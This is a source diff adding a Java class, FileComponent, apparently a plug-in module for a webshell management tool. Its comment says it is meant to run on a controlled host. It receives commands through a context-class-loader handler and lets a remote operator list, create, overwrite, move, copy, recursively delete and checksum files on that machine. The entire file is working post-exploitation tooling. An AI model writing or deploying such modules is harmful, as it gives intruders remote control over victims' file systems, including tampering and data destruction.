@@ -1,0 +1,704 @@
+package org.leo.javacore.component;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.charset.Charset;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+
+/**
+ * 文件操作组件，提供跨平台的文件和目录操作功能，设计为在被控主机上稳定执行。
+ *
+ */
+public class FileComponent implements Runnable {
+
+    private static final int MAX_DELETE_DEPTH = 50;
+    private static final long MAX_WRITE_BYTES = 50L * 1024 * 1024;
+    private static final int COPY_BUFFER_SIZE = 8192;
+
+    private HashMap<String, Object> params;
+    private HashMap<String, Object> results;
+
+    public void run() {
+        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
+        try {
+            params = (HashMap) h.invoke(null, null, null);
+            results = new HashMap();
+            invoke();
+        } catch (Throwable t) {
+            if (results == null) results = new HashMap();
+            setResult(500, t.getMessage());
+        }
+        if (results != null) {
+            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
+        }
+    }
+
+    /**
+     * 文件操作处理
+     */
+    public void invoke() throws Exception {
+        String action = getStringParam("action");
+        if ("profile".equals(action)) getFileSystemProfile();
+        else if ("list".equals(action)) getFileList();
+        else if ("delete".equals(action)) deleteFile();
+        else if ("createDirectory".equals(action)) createDirectory();
+        else if ("createFile".equals(action)) createNewFile();
+        else if ("move".equals(action)) moveFile();
+        else if ("edit".equals(action)) editFile();
+        else if ("copy".equals(action)) copyFile();
+        else if ("checksum".equals(action)) getFileMD5();
+        else throw new IllegalArgumentException("Invalid action: " + action);
+    }
+
+    private void getFileSystemProfile() {
+        String osName = System.getProperty("os.name", "");
+        boolean windows = osName.toLowerCase().contains("win");
+        List roots = new ArrayList();
+        File[] rootFiles = File.listRoots();
+        if (rootFiles != null) {
+            for (File root : rootFiles) {
+                roots.add(root.getPath());
+            }
+        }
+        Map capabilities = new HashMap();
+        capabilities.put("posixMode", Boolean.valueOf(!windows));
+        capabilities.put("windowsAttributes", Boolean.valueOf(windows));
+        capabilities.put("transactionalUpload", Boolean.TRUE);
+        capabilities.put("rangeRead", Boolean.TRUE);
+        capabilities.put("checksum", Boolean.TRUE);
+        capabilities.put("grep", Boolean.TRUE);
+        capabilities.put("touch", Boolean.TRUE);
+        capabilities.put("pack", Boolean.TRUE);
+        capabilities.put("rename", Boolean.TRUE);
+        capabilities.put("chmod", Boolean.valueOf(!windows));
+        capabilities.put("copyDirectory", Boolean.FALSE);
+        capabilities.put("compressionFormats", java.util.Arrays.asList(new String[]{"zip"}));
+        capabilities.put("extractionFormats", java.util.Arrays.asList(new String[]{"zip", "gzip", "tar", "tar.gz"}));
+        capabilities.put("maxUploadChunkBytes", Integer.valueOf(1048576));
+
+        results.put("code", Integer.valueOf(200));
+        results.put("osFamily", windows ? "WINDOWS" : "POSIX");
+        results.put("pathStyle", windows ? "WINDOWS" : "POSIX");
+        results.put("separator", File.separator);
+        results.put("caseSensitivity", windows ? "INSENSITIVE" : "SENSITIVE");
+        results.put("roots", roots);
+        results.put("capabilities", capabilities);
+    }
+
+    /**
+     * 获取文件列表
+     */
+    private void getFileList() throws Exception {
+        String path = getStringParam("path");
+
+        File directory = new File(path);
+        if (!directory.exists()) {
+            setResult(500, "directory not found: " + path);
+            return;
+        }
+
+        if (!directory.isDirectory()) {
+            setResult(500, "not a directory: " + path);
+            return;
+        }
+
+        List fileList = new ArrayList();
+        File[] files = directory.listFiles();
+
+        if (files != null) {
+            for (File file : files) {
+                fileList.add(getFileInfoMap(file));
+            }
+        }
+
+        results.put("code", 200);
+        results.put("fileList", fileList);
+        results.put("absolutePath", directory.getAbsolutePath());
+        results.put("count", Integer.valueOf(fileList.size()));
+    }
+
+    /**
+     * 删除文件
+     */
+    private void deleteFile() throws Exception {
+        String path = getStringParam("path");
+
+        File file = new File(path);
+        if (!file.exists()) {
+            setResult(500, "file not found: " + path);
+            return;
+        }
+
+        if (file.isDirectory()) {
+            // 符号链接仅删除链接本身，不递归进入链接目标。
+            if (isSymbolicLink(file)) {
+                boolean success = file.delete();
+                setResult(success ? 200 : 500, success ? "symlink deleted: " + file.getName()
+                        : "failed to delete symlink: " + file.getName());
+                return;
+            }
+
+            List failedFiles = new ArrayList();
+            boolean success = deleteDirectory(file, 0, failedFiles);
+
+            if (success && failedFiles.isEmpty()) {
+                setResult(200, "directory deleted: " + file.getName());
+            } else {
+                setResult(500, "delete partially failed: " + file.getName());
+                if (!failedFiles.isEmpty()) {
+                    results.put("failedFiles", failedFiles);
+                    results.put("failedCount", Integer.valueOf(failedFiles.size()));
+                }
+            }
+        } else {
+            boolean success = file.delete();
+            setResult(success ? 200 : 500, success ? "deleted: " + file.getName()
+                    : "failed to delete: " + file.getName());
+        }
+    }
+
+    /**
+     * 创建目录
+     */
+    private void createDirectory() throws Exception {
+        String path = getStringParam("path");
+
+        File directory = new File(path);
+        if (directory.exists()) {
+            setResult(500, "directory already exists: " + path);
+            return;
+        }
+
+        if (directory.mkdirs()) {
+            setResult(200, "directory created: " + path);
+            results.put("absolutePath", directory.getAbsolutePath());
+        } else {
+            setResult(500, "failed to create directory: " + path);
+        }
+    }
+
+    /**
+     * 创建新文件
+     * 支持可选 content 参数。
+     */
+    private void createNewFile() throws Exception {
+        String path = getStringParam("path");
+        byte[] content = (byte[]) params.get("content");
+        if (!validateContentSize(content)) return;
+
+        File file = new File(path);
+        if (file.exists()) {
+            setResult(500, "file already exists: " + path);
+            return;
+        }
+
+        if (!ensureParentDirectory(file, "parent")) return;
+
+        if (!file.createNewFile()) {
+            setResult(500, "failed to create file: " + path);
+            return;
+        }
+
+        // 如果 params 包含 content，写入初始内容
+        if (content != null && content.length > 0) {
+            writeFileContent(file, content);
+        }
+
+        setResult(200, "file created: " + path);
+        results.put("absolutePath", file.getAbsolutePath());
+        if (content != null) {
+            results.put("size", Integer.valueOf(content.length));
+        }
+    }
+
+    /** 移动文件，overwrite 时以同目录备份保证失败可回滚。 */
+    private void moveFile() throws Exception {
+        String sourcePath = getStringParam("path");
+        String newPath = getStringParam("newPath");
+        String strategy = getStringParam("conflictStrategy");
+        validateConflictStrategy(strategy);
+
+        File sourceFile = new File(sourcePath);
+        File destFile = new File(newPath);
+
+        if (!sourceFile.exists()) {
+            setResult(500, "source not found: " + sourcePath);
+            return;
+        }
+
+        destFile = prepareDestination(destFile, strategy);
+        if (destFile == null) return;
+
+        File backupFile;
+        try {
+            backupFile = prepareOverwriteBackup(destFile, strategy);
+        } catch (IOException error) {
+            setResult(500, error.getMessage());
+            return;
+        }
+
+        if (sourceFile.renameTo(destFile)) {
+            deleteBackup(backupFile);
+            setResult(200, "moved: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
+            results.put("newPath", destFile.getAbsolutePath());
+            return;
+        }
+
+        if (!sourceFile.isFile()) {
+            restoreBackup(destFile, backupFile);
+            setResult(500, "move failed (cross-filesystem directory move not supported): "
+                    + sourcePath + " -> " + destFile.getAbsolutePath());
+            return;
+        }
+
+        copyAndCommit(sourceFile, destFile, backupFile, sourcePath, true);
+    }
+
+    /** 返回 null 表示无需备份；失败时目标文件保持不变。 */
+    private File prepareOverwriteBackup(File target, String strategy) throws IOException {
+        if (!"overwrite".equals(strategy) || !target.exists()) return null;
+        if (target.isDirectory()) {
+            throw new IOException("cannot overwrite directory: " + target.getAbsolutePath());
+        }
+        File backup = createBackupFile(target);
+        if (!target.renameTo(backup)) {
+            throw new IOException("cannot prepare target backup: " + target.getAbsolutePath());
+        }
+        return backup;
+    }
+
+    private File createBackupFile(File target) {
+        File parent = target.getParentFile();
+        String name = target.getName();
+        for (int i = 0; i < 1000; i++) {
+            File candidate = new File(parent,
+                    name + ".leo-backup-" + System.currentTimeMillis() + "-" + i);
+            if (!candidate.exists()) {
+                return candidate;
+            }
+        }
+        return new File(parent, name + ".leo-backup-" + System.nanoTime());
+    }
+
+    private void restoreBackup(File target, File backup) {
+        if (backup == null || !backup.exists()) {
+            if (target.exists()) {
+                target.delete();
+            }
+            return;
+        }
+        if (target.exists() && !target.delete()) {
+            throw new IllegalStateException("cannot remove incomplete target: " + target.getAbsolutePath());
+        }
+        if (!backup.renameTo(target)) {
+            throw new IllegalStateException("cannot restore target backup: " + target.getAbsolutePath());
+        }
+    }
+
+    private void deleteBackup(File backup) {
+        if (backup != null && backup.exists() && !backup.delete()) {
+            backup.deleteOnExit();
+        }
+    }
+
+    /**
+     * 编辑文件
+     */
+    private void editFile() throws Exception {
+        String path = getStringParam("path");
+
+        byte[] content = (byte[]) params.get("content");
+        if (content == null) {
+            setResult(500, "content is null");
+            return;
+        }
+
+        if (!validateContentSize(content)) return;
+
+        File file = new File(path);
+        if (!ensureParentDirectory(file, "parent")) return;
+        writeFileContent(file, content);
+
+        setResult(200, "file edited: " + path);
+        results.put("size", Integer.valueOf(content.length));
+        results.put("absolutePath", file.getAbsolutePath());
+    }
+
+    /**
+     * 获取文件MD5值
+     */
+    private void getFileMD5() throws Exception {
+        String path = getStringParam("path");
+
+        File file = new File(path);
+        if (!file.exists()) {
+            setResult(500, "file not found: " + path);
+            return;
+        }
+
+        if (!file.isFile()) {
+            setResult(500, "not a file: " + path);
+            return;
+        }
+
+        String md5 = calculateFileMD5(file);
+        results.put("code", 200);
+        results.put("md5", md5);
+        results.put("filePath", file.getAbsolutePath());
+        results.put("fileSize", Long.valueOf(file.length()));
+    }
+
+    /**
+     * 复制文件并保留最后修改时间。
+     * 支持 conflictStrategy: overwrite / autorename / skip。
+     */
+    private void copyFile() throws Exception {
+        String sourcePath = getStringParam("path");
+        String destPath = getStringParam("destPath");
+        String strategy = getStringParam("conflictStrategy");
+        validateConflictStrategy(strategy);
+
+        File sourceFile = new File(sourcePath);
+        File destFile = new File(destPath);
+
+        if (!sourceFile.exists()) {
+            setResult(500, "source not found: " + sourcePath);
+            return;
+        }
+
+        if (!sourceFile.isFile()) {
+            setResult(500, "source is not a file: " + sourcePath);
+            return;
+        }
+
+        destFile = prepareDestination(destFile, strategy);
+        if (destFile == null) return;
+
+        File backupFile;
+        try {
+            backupFile = prepareOverwriteBackup(destFile, strategy);
+        } catch (IOException error) {
+            setResult(500, error.getMessage());
+            return;
+        }
+
+        copyAndCommit(sourceFile, destFile, backupFile, sourcePath, false);
+    }
+
+    /** 复制或跨文件系统移动共用提交、时间戳保留及失败回滚。 */
+    private void copyAndCommit(File sourceFile, File destFile, File backupFile,
+                               String sourcePath, boolean move) throws Exception {
+        try {
+            long totalBytes = copyFileContent(sourceFile, destFile);
+            destFile.setLastModified(sourceFile.lastModified());
+            if (move && !sourceFile.delete()) {
+                restoreBackup(destFile, backupFile);
+                setResult(500, "move rollback: source delete failed: " + sourcePath);
+                return;
+            }
+            deleteBackup(backupFile);
+            setResult(200, (move ? "moved: " : "copied: ")
+                    + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
+            results.put("newPath", destFile.getAbsolutePath());
+            results.put("size", Long.valueOf(totalBytes));
+        } catch (Exception error) {
+            restoreBackup(destFile, backupFile);
+            throw error;
+        }
+    }
+
+    /** 返回 null 表示已写入跳过或失败响应，调用方应结束操作。 */
+    private File prepareDestination(File dest, String strategy) {
+        File resolved = resolveConflict(dest, strategy);
+        if (resolved == null) {
+            setResult(200, "skipped: target exists: " + dest.getAbsolutePath());
+            results.put("skipped", Boolean.TRUE);
+            results.put("newPath", dest.getAbsolutePath());
+            return null;
+        }
+        return ensureParentDirectory(resolved, "target") ? resolved : null;
+    }
+
+    /**
+     * 解析目标路径上的同名冲突。
+     *
+     * @param dest     原始目标
+     * @param strategy overwrite / autorename / skip
+     * @return 实际应使用的目标 File；返回 null 表示 skip
+     */
+    private File resolveConflict(File dest, String strategy) {
+        if (dest == null || !dest.exists()) {
+            return dest;
+        }
+        if ("overwrite".equals(strategy)) {
+            return dest;
+        }
+        if ("skip".equals(strategy)) {
+            return null;
+        }
+        if ("autorename".equals(strategy)) {
+            return autoRename(dest);
+        }
+        throw new IllegalArgumentException("unsupported conflictStrategy: " + strategy);
+    }
+
+    private void validateConflictStrategy(String strategy) {
+        if (!"overwrite".equals(strategy)
+                && !"autorename".equals(strategy)
+                && !"skip".equals(strategy)) {
+            throw new IllegalArgumentException("unsupported conflictStrategy: " + strategy);
+        }
+    }
+
+    /**
+     * 在目标同目录下找一个不冲突的名字：foo.txt -> foo (1).txt -> foo (2).txt ...
+     * 上限 1000 次，避免极端情况死循环。
+     */
+    private File autoRename(File dest) {
+        File parent = dest.getParentFile();
+        String name = dest.getName();
+        String base;
+        String ext;
+        int dot = name.lastIndexOf('.');
+        // 仅当点号不在开头才视为扩展名（避免 .bashrc 被切）
+        if (dot > 0) {
+            base = name.substring(0, dot);
+            ext = name.substring(dot);
+        } else {
+            base = name;
+            ext = "";
+        }
+        for (int i = 1; i <= 1000; i++) {
+            File candidate = new File(parent, base + " (" + i + ")" + ext);
+            if (!candidate.exists()) {
+                return candidate;
+            }
+        }
+        return new File(parent, base + " (" + System.currentTimeMillis() + ")" + ext);
+    }
+
+    // ==================== 辅助方法 ====================
+
+    private void setResult(int code, String message) {
+        results.put("code", Integer.valueOf(code));
+        results.put("msg", message);
+    }
+
+    private boolean validateContentSize(byte[] content) {
+        if (content != null && content.length > MAX_WRITE_BYTES) {
+            setResult(500, "content too large: " + content.length + " bytes, max: " + MAX_WRITE_BYTES);
+            return false;
+        }
+        return true;
+    }
+
+    private boolean ensureParentDirectory(File file, String description) {
+        File parent = file.getParentFile();
+        if (parent != null && !parent.exists() && !parent.mkdirs()) {
+            setResult(500, "cannot create " + description + " directory: " + parent.getAbsolutePath());
+            return false;
+        }
+        return true;
+    }
+
+    private void writeFileContent(File file, byte[] content) throws IOException {
+        FileOutputStream output = null;
+        try {
+            output = new FileOutputStream(file);
+            output.write(content);
+            output.flush();
+        } finally {
+            closeResource(output);
+        }
+    }
+
+    /**
+     * 读取文本参数；二进制文本按 UTF-8 解码。
+     */
+    private String getStringParam(String key) {
+        Object value = params.get(key);
+        if (value == null) {
+            return null;
+        }
+        if (value instanceof byte[]) {
+            return new String((byte[]) value, Charset.forName("UTF-8"));
+        }
+        return String.valueOf(value);
+    }
+
+    /**
+     * 复制文件内容。
+     */
+    private long copyFileContent(File source, File dest) throws Exception {
+        long totalBytes = 0;
+        FileInputStream fis = null;
+        FileOutputStream fos = null;
+        try {
+            fis = new FileInputStream(source);
+            fos = new FileOutputStream(dest);
+            byte[] buffer = new byte[COPY_BUFFER_SIZE];
+            int bytesRead;
+            while ((bytesRead = fis.read(buffer)) != -1) {
+                fos.write(buffer, 0, bytesRead);
+                totalBytes += bytesRead;
+            }
+            fos.flush();
+        } finally {
+            closeResource(fis);
+            closeResource(fos);
+        }
+        return totalBytes;
+    }
+
+    /**
+     * 获取文件信息映射
+     */
+    private Map getFileInfoMap(File file) {
+        Map fileInfo = new HashMap();
+
+        fileInfo.put("name", file.getName());
+        fileInfo.put("path", file.getAbsolutePath());
+        fileInfo.put("size", Long.valueOf(file.length()));
+        fileInfo.put("modified", Long.valueOf(file.lastModified()));
+        fileInfo.put("isDirectory", Boolean.valueOf(file.isDirectory()));
+        fileInfo.put("isFile", Boolean.valueOf(file.isFile()));
+        fileInfo.put("canRead", Boolean.valueOf(canRead(file)));
+        fileInfo.put("canWrite", Boolean.valueOf(canWrite(file)));
+        fileInfo.put("canExecute", Boolean.valueOf(canExecute(file)));
+        fileInfo.put("exists", Boolean.valueOf(file.exists()));
+
+        // 获取文件扩展名
+        String fileName = file.getName();
+        int lastDotIndex = fileName.lastIndexOf('.');
+        if (lastDotIndex > 0) {
+            fileInfo.put("extension", fileName.substring(lastDotIndex + 1));
+        }
+        return fileInfo;
+    }
+
+    // 安全策略可能直接拒绝权限查询；按无权限展示，避免中断整个目录列表。
+    private boolean canRead(File file) {
+        try {
+            return file.canRead();
+        } catch (SecurityException ignored) {
+            return false;
+        }
+    }
+
+    private boolean canWrite(File file) {
+        try {
+            return file.canWrite();
+        } catch (SecurityException ignored) {
+            return false;
+        }
+    }
+
+    private boolean canExecute(File file) {
+        try {
+            return file.canExecute();
+        } catch (SecurityException ignored) {
+            return false;
+        }
+    }
+
+    /**
+     * 检测是否为符号链接。远端组件保持 Java 6 API 基线，因此通过
+     * canonical path 与 absolute path 比较，不依赖 NIO。
+     */
+    private boolean isSymbolicLink(File file) {
+        try {
+            File parent = file.getParentFile();
+            // 先对父目录做 canonical 解析，只比较当前文件名这一层
+            File canonical;
+            if (parent != null) {
+                canonical = new File(parent.getCanonicalFile(), file.getName());
+            } else {
+                canonical = file;
+            }
+            return !canonical.getCanonicalPath().equals(canonical.getAbsolutePath());
+        } catch (Exception e) {
+            // 无法判断时保守认为不是
+            return false;
+        }
+    }
+
+    /**
+     * 递归删除目录，带深度限制和失败收集。
+     *
+     * @param directory   要删除的目录
+     * @param depth       当前递归深度
+     * @param failedFiles 删除失败的文件路径列表（输出参数）
+     * @return 目录本身是否删除成功
+     */
+    private boolean deleteDirectory(File directory, int depth, List failedFiles) {
+        if (depth > MAX_DELETE_DEPTH) {
+            failedFiles.add(directory.getAbsolutePath() + " (max depth exceeded)");
+            return false;
+        }
+
+        if (!directory.exists()) {
+            return true;
+        }
+
+        File[] files = directory.listFiles();
+        if (files != null) {
+            for (File child : files) {
+                // 子项为符号链接时仅删除链接本身。
+                if (child.isDirectory() && !isSymbolicLink(child)) {
+                    deleteDirectory(child, depth + 1, failedFiles);
+                } else if (!child.delete()) {
+                    failedFiles.add(child.getAbsolutePath());
+                }
+            }
+        }
+
+        boolean deleted = directory.delete();
+        if (!deleted) {
+            failedFiles.add(directory.getAbsolutePath());
+        }
+        return deleted;
+    }
+
+    /**
+     * 计算文件 MD5 值
+     */
+    private String calculateFileMD5(File file) throws Exception {
+        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
+        FileInputStream fis = null;
+
+        try {
+            fis = new FileInputStream(file);
+            byte[] buffer = new byte[COPY_BUFFER_SIZE];
+            int bytesRead;
+
+            while ((bytesRead = fis.read(buffer)) != -1) {
+                md.update(buffer, 0, bytesRead);
+            }
+
+            byte[] digest = md.digest();
+            StringBuilder hexString = new StringBuilder(32);
+
+            for (byte value : digest) {
+                String hex = Integer.toHexString(0xff & value);
+                if (hex.length() == 1) {
+                    hexString.append('0');
+                }
+                hexString.append(hex);
+            }
+
+            return hexString.toString();
+        } finally {
+            closeResource(fis);
+        }
+    }
+
+    private void closeResource(java.io.Closeable resource) {
+        if (resource == null) return;
+        try { resource.close(); } catch (Exception ignored) {}
+    }
+}
